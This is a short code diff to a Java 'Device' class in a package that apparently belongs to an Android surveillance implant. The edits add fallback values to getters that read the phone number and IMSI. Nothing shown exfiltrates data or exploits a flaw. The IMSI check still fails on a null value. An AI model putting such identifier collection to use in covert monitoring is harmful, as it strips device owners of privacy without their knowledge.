@@ -22,8 +22,8 @@ import com.ht.RCSAndroidGUI.util.Utils;
  * The Class Device.
  */
 public class Device {
-
 	private static final String TAG = "Device";
+	
 	/** The singleton. */
 	private volatile static Device singleton;
 
@@ -75,8 +75,16 @@ public class Device {
 	 */
 	public String getPhoneNumber() {
 		TelephonyManager mTelephonyMgr;
-		mTelephonyMgr = (TelephonyManager)Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
-		return mTelephonyMgr.getLine1Number();
+
+		mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+		
+		String number = mTelephonyMgr.getLine1Number();
+		
+		if (number != null) {
+			return number;
+		} else {
+			return "Unknown";
+		}
 	}
 	
 	/**
@@ -125,9 +133,15 @@ public class Device {
 	 * @return the imsi
 	 */
 	public String getImsi() {
-		final TelephonyManager telephonyManager = (TelephonyManager) Status
-				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
-		return telephonyManager.getSubscriberId();
+		final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().
+			getSystemService(Context.TELEPHONY_SERVICE);
+		
+		String imsi = telephonyManager.getSubscriberId();
+		
+		if (imsi.length() == 0)
+			imsi = "N/A";
+		
+		return imsi;
 	}
 	
 	public static CellInfo getCellInfo(){
